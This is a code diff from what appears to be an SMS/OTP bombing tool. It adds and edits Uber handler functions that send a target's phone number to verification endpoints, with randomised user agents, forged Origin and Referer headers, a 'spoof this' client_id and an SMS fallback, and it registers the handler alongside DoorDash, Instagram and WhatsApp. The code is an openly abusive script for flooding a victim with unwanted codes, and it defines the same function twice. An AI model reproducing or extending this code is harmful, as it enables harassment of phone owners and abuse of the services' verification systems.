@@ -2993,18 +2993,31 @@ def send_amazon_ca_otp(phone):
     except:
         return False, None, ''
 
-def send_uber_ca_otp(phone):
+# ===== UBER OTP HANDLER =====
+def send_uber_otp(phone):
+    """Uber OTP - sends verification code via WhatsApp/SMS"""
     try:
-        url = "https://auth.uber.com/api/v1.0/auth/verification/send"
-        payload = {"phone": fmt_ca(phone), "locale": "en-CA", "method": "whatsapp"}
-        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        phone_plus = fmt_plus(phone)
+        url = "https://auth.uber.com/api/v1/auth/verification/send"
+        payload = {
+            "phone": phone_plus,
+            "locale": "id-ID",
+            "method": "whatsapp",
+            "client_id": "YOUR_CLIENT_ID"  # spoof this
+        }
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.uber.com',
+            'Referer': 'https://www.uber.com/'
+        }
         resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
         if resp and resp.status_code < 400:
             return True, resp.status_code, 'OK'
-        return False, resp.status_code if resp else None, ''
+        return False, resp.status_code if resp else None, 'Failed'
     except:
-        return False, None, ''
-
+        return False, None, 'Error'
+        
 # --- MEXICO (5+) ---
 def send_amazon_mx_otp(phone):
     try:
@@ -3017,6 +3030,38 @@ def send_amazon_mx_otp(phone):
         return False, resp.status_code if resp else None, ''
     except:
         return False, None, ''
+
+def send_uber_otp(phone):
+    """Uber OTP - multiple endpoint fallback"""
+    try:
+        phone_plus = fmt_plus(phone)
+        # Primary endpoint
+        url = "https://auth.uber.com/api/v1/auth/verification/send"
+        payload = {
+            "phone": phone_plus,
+            "locale": "id-ID",
+            "method": "whatsapp",
+            "client_id": "YOUR_CLIENT_ID"
+        }
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.uber.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        
+        if resp and resp.status_code < 400:
+            return True, resp.status_code, 'OK'
+        
+        # Fallback: try SMS instead
+        payload["method"] = "sms"
+        resp2 = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        if resp2 and resp2.status_code < 400:
+            return True, resp2.status_code, 'OK (SMS)'
+        
+        return False, resp.status_code if resp else None, 'Failed'
+    except Exception as e:
+        return False, None, f'Error: {str(e)[:50]}'
 
 # --- SOUTH AMERICA (15+) ---
 def send_mercadolibre_ar_otp(phone):
@@ -3337,6 +3382,7 @@ ALL_HANDLERS = {
     'tuneup': send_tuneup_otp,
     
     # GLOBAL - WORKING
+    'uber': send_uber_otp,
     'doordash': send_doordash_otp,
     'instagram': send_instagram_otp,
     'whatsapp': send_whatsapp_otp,
